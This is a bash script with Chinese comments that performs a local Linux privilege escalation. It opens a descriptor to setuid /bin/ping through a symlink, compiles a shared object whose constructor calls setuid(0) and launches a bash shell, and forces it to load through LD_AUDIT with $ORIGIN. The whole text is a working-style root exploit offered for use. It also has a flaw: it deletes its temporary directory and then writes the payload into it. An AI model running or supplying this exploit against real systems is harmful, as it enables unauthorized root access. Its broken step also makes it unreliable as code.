#!/bin/bash

# 定义临时目录和文件名
TMP_DIR="/tmp/exploit"
TARGET_BIN="/bin/ping"
PAYLOAD_FILE="$TMP_DIR/payload.c"
PAYLOAD_SO="$TMP_DIR/exploit"

# 打印提示信息
echo "[+] 开始提权操作..."

# 在 /tmp 下创建可控的目录
echo "[+] 创建目录 $TMP_DIR"
mkdir -p "$TMP_DIR"

# 创建目标二进制程序的符号链接
echo "[+] 创建符号链接到 $TARGET_BIN"
ln -s "$TARGET_BIN" "$TMP_DIR/target"

# 打开符号链接文件描述符
echo "[+] 打开目标文件描述符"
exec 3< "$TMP_DIR/target"

# 显示文件描述符信息
echo "[+] 文件描述符状态:"
ls -l /proc/$$/fd/3

# 删除之前创建的目录
echo "[+] 删除目录 $TMP_DIR"
rm -rf "$TMP_DIR"

# 显示被标记为已删除的文件描述符
echo "[+] 确认文件描述符仍存在:"
ls -l /proc/$$/fd/3

# 创建 payload.c 文件
echo "[+] 创建 payload.c 文件"
cat > "$PAYLOAD_FILE" <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init() 
{ 
    setuid(0); 
    system("/bin/bash"); 
}
EOF

# 编译 payload.c 为共享对象文件
echo "[+] 编译 payload.c 为共享对象文件"
gcc -w -fPIC -shared -o "$PAYLOAD_SO" "$PAYLOAD_FILE"

# 检查生成的共享对象文件
echo "[+] 生成的共享对象文件:"
ls -l "$PAYLOAD_SO"

# 使用 LD_AUDIT 强制加载共享对象文件
echo "[+] 使用 LD_AUDIT 强制加载共享对象..."
LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3
